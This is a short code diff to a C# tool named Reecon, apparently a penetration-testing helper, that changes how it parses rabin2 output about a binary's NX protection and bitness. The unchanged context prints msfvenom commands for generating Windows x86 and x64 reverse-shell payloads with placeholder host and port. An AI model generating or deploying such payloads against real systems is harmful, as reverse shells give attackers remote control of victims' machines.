@@ -192,7 +192,7 @@ namespace Reecon
             if (General.IsInstalledOnLinux("rabin2"))
             {
                 List<string> rabin2Output = General.GetProcessOutput("rabin2", "-I ./" + fileName);
-                if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("nx")).Contains("false"))
+                if (rabin2Output.First(x => x.Trim().StartsWith("nx")).Contains("false"))
                 {
                     Console.WriteLine("- nx is disabled - You can run your own shellcode!");
                     if (architecture == Architecture.Linux64) // bits ?
@@ -207,11 +207,11 @@ namespace Reecon
                     {
                         // -f c = Format (Else it just parses raw bytes instead of showing them)
                         // -b = Bad characters
-                        if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("bits")).Contains("32"))
+                        if (rabin2Output.First(x => x.Trim().StartsWith("bits")).Contains("32"))
                         {
                             Console.WriteLine("-- Windows - x86 Reverse Shell: msfvenom -p windows/shell_reverse_tcp LHOST=ipHere LPORT=portHere -a x86 --platform windows -f c -b \"\\x00\"");
                         }
-                        else if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("bits")).Contains("64"))
+                        else if (rabin2Output.First(x => x.Trim().StartsWith("bits")).Contains("64"))
                         {
                             Console.WriteLine("-- Windows - x64 Reverse Shell: msfvenom -p windows/shell_reverse_tcp LHOST=ipHere LPORT=portHere -a x64 --platform windows -f c -b \"\\x00\"");
                         }
@@ -227,7 +227,7 @@ namespace Reecon
                         Console.WriteLine("Unknown Outer Arch - Bug Reelix to fix his code!");
                     }
                 }
-                else if (rabin2Output.FirstOrDefault(x => x.Trim().StartsWith("nx")).Contains("true"))
+                else if (rabin2Output.First(x => x.Trim().StartsWith("nx")).Contains("true"))
                 {
                     Console.WriteLine("- nx enabled - No custom shellcode for you!");
                 }
